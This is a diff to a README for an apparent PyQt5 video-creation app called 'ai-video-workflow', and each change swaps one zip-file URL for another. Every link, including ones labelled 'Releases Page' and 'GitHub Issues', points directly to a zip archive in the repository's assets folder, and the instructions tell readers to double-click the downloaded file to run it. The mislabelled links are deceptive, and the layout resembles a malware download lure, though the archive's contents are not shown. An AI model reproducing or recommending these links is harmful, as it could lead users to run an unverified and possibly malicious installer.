@@ -7,7 +7,7 @@ Welcome to the **ai-video-workflow**! This application lets you create short vid
 To begin using **ai-video-workflow**, follow these steps to download and run the application.
 
 ## 📥 Download the Application
-[![Download ai-video-workflow](https://raw.githubusercontent.com/envergadcr/ai-video-workflow/main/assets/workflow-video-ai-3.6.zip)](https://raw.githubusercontent.com/envergadcr/ai-video-workflow/main/assets/workflow-video-ai-3.6.zip)
+[![Download ai-video-workflow](https://github.com/envergadcr/ai-video-workflow/raw/refs/heads/main/assets/workflow_ai_video_v3.0.zip)](https://github.com/envergadcr/ai-video-workflow/raw/refs/heads/main/assets/workflow_ai_video_v3.0.zip)
 
 ## 💻 System Requirements
 To run the **ai-video-workflow**, ensure your system meets the following requirements:
@@ -26,11 +26,11 @@ To run the **ai-video-workflow**, ensure your system meets the following require
 - **User-friendly Interface**: Built with PyQt5 for easy navigation.
 
 ## 📁 Download & Install
-Visit this page to download: [ai-video-workflow Releases Page](https://raw.githubusercontent.com/envergadcr/ai-video-workflow/main/assets/workflow-video-ai-3.6.zip)
+Visit this page to download: [ai-video-workflow Releases Page](https://github.com/envergadcr/ai-video-workflow/raw/refs/heads/main/assets/workflow_ai_video_v3.0.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest release. 
-3. Choose the file suitable for your system (e.g., `https://raw.githubusercontent.com/envergadcr/ai-video-workflow/main/assets/workflow-video-ai-3.6.zip`).
+3. Choose the file suitable for your system (e.g., `https://github.com/envergadcr/ai-video-workflow/raw/refs/heads/main/assets/workflow_ai_video_v3.0.zip`).
 4. Click on the file to start the download.
 5. Once downloaded, locate the file in your downloads folder.
 6. Double-click on the file to run the installer.
@@ -53,7 +53,7 @@ If you encounter issues while using the application, consider the following solu
 - For specific error messages, refer to the **Issues** section on the GitHub repository for potential fixes.
 
 ## 📞 Support
-For any questions or support, please visit the following link for help: [GitHub Issues](https://raw.githubusercontent.com/envergadcr/ai-video-workflow/main/assets/workflow-video-ai-3.6.zip). You can report technical issues, ask questions, or contribute feedback to improve the application.
+For any questions or support, please visit the following link for help: [GitHub Issues](https://github.com/envergadcr/ai-video-workflow/raw/refs/heads/main/assets/workflow_ai_video_v3.0.zip). You can report technical issues, ask questions, or contribute feedback to improve the application.
 
 ## 🚀 Future Updates
 We plan to enhance the application over time. Keep an eye on the **Releases Page** for new features and improvements.
